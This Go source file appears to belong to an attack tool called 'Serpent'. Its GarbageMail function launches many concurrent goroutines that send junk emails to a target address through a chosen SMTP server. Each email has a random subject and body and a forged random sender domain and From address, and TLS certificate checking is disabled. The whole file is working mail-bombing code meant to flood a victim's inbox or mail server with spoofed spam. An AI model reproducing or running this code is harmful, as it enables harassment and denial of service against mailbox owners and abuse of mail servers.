package mail

import (
	"Serpent/control"
	"crypto/tls"
	"fmt"
	"gopkg.in/gomail.v2"
	"math/rand"
)

func GetRandomString(n int) string {
	str := "0123456789abcdefghijklmnopqrstuvwxyz"
	bytes := []byte(str)
	var result []byte
	for i := 0; i < n; i++ {
		result = append(result, bytes[rand.Intn(len(bytes))])
	}
	return string(result)
}

func GarbageMail(smtp string, mail string, port int, thread int) {
	for i := 1; i <= thread; i++ {
		control.Wg.Add(1)
		go run(smtp, mail, port, thread)
	}
	control.Wg.Done()

}

func run(smtp string, mail string, port int, thread int) {
	helo := fmt.Sprintf(GetRandomString(3) + ".com")
	from := fmt.Sprintf(GetRandomString(5) + "@" + helo)
	m := gomail.NewMessage()
	m.SetHeader("Helo", helo)
	m.SetHeader("From", from)
	m.SetHeader("To", mail)
	m.SetHeader("Subject", GetRandomString(5))
	m.SetBody("text/plain", GetRandomString(20))
	d := gomail.Dialer{Host: smtp, Port: port}
	d.TLSConfig = &tls.Config{InsecureSkipVerify: true}
	if err := d.DialAndSend(m); err != nil {
		fmt.Println(err)
	}
	fmt.Println("domainname:" + helo + " " + "from:" + from)
}
